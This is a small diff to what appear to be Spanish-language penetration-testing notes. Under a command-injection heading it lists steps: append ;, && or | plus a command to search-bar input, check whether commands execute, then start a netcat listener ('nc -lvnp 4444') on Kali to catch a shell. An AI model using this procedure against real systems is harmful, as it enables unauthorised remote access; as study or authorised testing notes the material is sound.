@@ -193,7 +193,7 @@ EXPLOTACION
             COMMAND INJECTION
             .................
 
-                  1 - Probar en la barra de busqueda el resultado esperado + ; o && o |
+                  1 - Probar en la barra de busqueda el resultado esperado + ; o && o | + Comando
                   2 - Si se ejecutan comandos existe vulnerabilidad
                   3 - Poner en escucha el kali 
                         nc -lvnp 4444
